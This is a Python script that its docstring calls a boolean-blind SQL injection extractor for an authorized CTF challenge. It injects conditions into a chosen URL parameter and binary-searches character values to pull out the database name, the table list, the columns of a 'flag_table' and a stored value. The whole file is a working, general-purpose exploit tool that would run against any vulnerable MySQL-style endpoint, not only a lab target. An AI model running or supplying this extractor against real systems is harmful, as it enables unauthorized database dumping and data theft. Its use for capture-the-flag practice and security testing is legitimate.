#!/usr/bin/env python3
"""Boolean-blind SQL injection extractor for an authorized CTF challenge."""

from __future__ import annotations

import argparse
import sys
import time

import requests


SESSION = requests.Session()


def query(url: str, param: str, cond: str, check: str, retries: int = 3) -> bool:
    payload = f"1 and ({cond})"
    for attempt in range(1, retries + 1):
        try:
            response = SESSION.get(
                url,
                params={param: payload},
                timeout=12,
            )
            time.sleep(0.05)
            return check in response.text
        except requests.RequestException as exc:
            print(f"[!] request failed ({attempt}/{retries}): {exc}", file=sys.stderr)
            if attempt < retries:
                time.sleep(1)
    return False


def extract(
    url: str,
    param: str,
    expr: str,
    check: str,
    max_len: int,
    label: str,
) -> str:
    output = ""
    for position in range(1, max_len + 1):
        low, high = 0, 127
        while low < high:
            middle = (low + high) // 2
            condition = (
                f"ascii(substr(({expr}),{position},1))>{middle}"
            )
            if query(url, param, condition, check):
                low = middle + 1
            else:
                high = middle
        if low <= 0:
            break
        output += chr(low)
        print(f"\r{label}{output}", end="", flush=True)
    print()
    return output


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", required=True)
    parser.add_argument("--param", default="id")
    parser.add_argument(
        "--check",
        required=True,
        help="Text present only when the SQL condition is true.",
    )
    parser.add_argument("--max-len", type=int, default=256)
    parser.add_argument("--cookie", default="")
    args = parser.parse_args()

    if args.cookie:
        SESSION.headers["Cookie"] = args.cookie

    database = extract(
        args.url,
        args.param,
        "select database()",
        args.check,
        64,
        "database: ",
    )
    print(f"[+] database={database}")

    tables = extract(
        args.url,
        args.param,
        "select group_concat(table_name) from information_schema.tables "
        "where table_schema=database()",
        args.check,
        args.max_len,
        "tables: ",
    )
    print(f"[+] tables={tables}")

    table_name = "flag_table"
    columns = extract(
        args.url,
        args.param,
        "select group_concat(column_name) from information_schema.columns "
        f"where table_schema=database() and table_name='{table_name}'",
        args.check,
        args.max_len,
        "columns: ",
    )
    print(f"[+] columns={columns}")

    candidates = [item.strip() for item in columns.split(",") if item.strip()]
    if not candidates:
        print("[-] no columns extracted", file=sys.stderr)
        return 1
    target_column = next(
        (item for item in candidates if item.lower() not in {"id"}),
        candidates[0],
    )
    print(f"[*] using column={target_column}")

    value = extract(
        args.url,
        args.param,
        f"select {target_column} from {table_name} limit 0,1",
        args.check,
        args.max_len,
        "value: ",
    )
    print(f"[+] value={value}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
